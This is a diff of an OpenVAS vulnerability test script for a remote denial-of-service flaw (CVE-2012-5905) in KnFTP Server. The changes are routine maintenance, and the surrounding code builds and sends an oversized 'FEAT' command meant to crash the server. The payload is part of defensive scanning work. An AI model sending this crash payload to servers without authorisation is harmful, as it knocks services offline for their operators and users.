@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: secpod_knftpd_feat_cmd_dos_vuln.nasl 11374 2018-09-13 12:45:05Z asteins $
+# $Id: secpod_knftpd_feat_cmd_dos_vuln.nasl 11436 2018-09-17 13:47:46Z cfischer $
 #
 # KnFTP Server 'FEAT' Command Remote Denial of Service Vulnerability
 #
@@ -27,12 +27,12 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.902826");
-  script_version("$Revision: 11374 $");
+  script_version("$Revision: 11436 $");
   script_cve_id("CVE-2012-5905");
   script_bugtraq_id(52805);
   script_tag(name:"cvss_base", value:"4.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:N/I:N/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2018-09-13 14:45:05 +0200 (Thu, 13 Sep 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-17 15:47:46 +0200 (Mon, 17 Sep 2018) $");
   script_tag(name:"creation_date", value:"2012-03-29 16:16:16 +0530 (Thu, 29 Mar 2012)");
   script_name("KnFTP Server 'FEAT' Command Remote Denial of Service Vulnerability");
   script_category(ACT_DENIAL);
@@ -62,24 +62,15 @@ if(description)
   exit(0);
 }
 
-
 include("ftp_func.inc");
 
-ftpPort = get_kb_item("Services/ftp");
-if(! ftpPort){
-  ftpPort = 21;
-}
-
-if(! get_port_state(ftpPort)){
-  exit(0);
-}
+ftpPort = get_ftp_port(default:21);
 
 banner = get_ftp_banner(port:ftpPort);
 if(! banner || "220 FTP Server ready." >!< banner){
   exit(0);
 }
 
-## Open FTP Socket
 soc = open_sock_tcp(ftpPort);
 if(! soc){
   exit(0);
@@ -102,7 +93,6 @@ if(! login_details){
 
 exploit = "FEAT " + crap(data:"./A",length:256*3);
 
-## Send the Attack Request
 ftp_send_cmd(socket:soc, cmd:exploit);
 ftp_close(socket:soc);
 sleep(3);
